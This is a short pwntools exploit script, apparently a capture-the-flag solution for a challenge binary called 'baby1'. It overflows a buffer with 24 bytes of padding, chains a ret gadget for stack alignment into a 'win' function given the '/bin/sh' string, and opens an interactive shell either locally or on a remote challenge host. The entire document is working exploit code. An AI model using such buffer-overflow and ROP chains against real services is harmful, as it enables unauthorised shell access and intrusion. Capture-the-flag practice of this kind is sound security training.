from pwn import *

isRemote = args['REMOTE']

binary = './baby1'

context.binary = binary
elf = ELF(binary)

r = ROP(elf)
r.raw(r.find_gadget(['ret']).address) # align the stack
r.win(next(elf.search('/bin/sh')))

p = remote('baby-01.pwn.beer', 10001) if isRemote else elf.process()

print(p.recvuntil('input: '))
p.sendline('A' * 24 + str(r))
p.interactive()
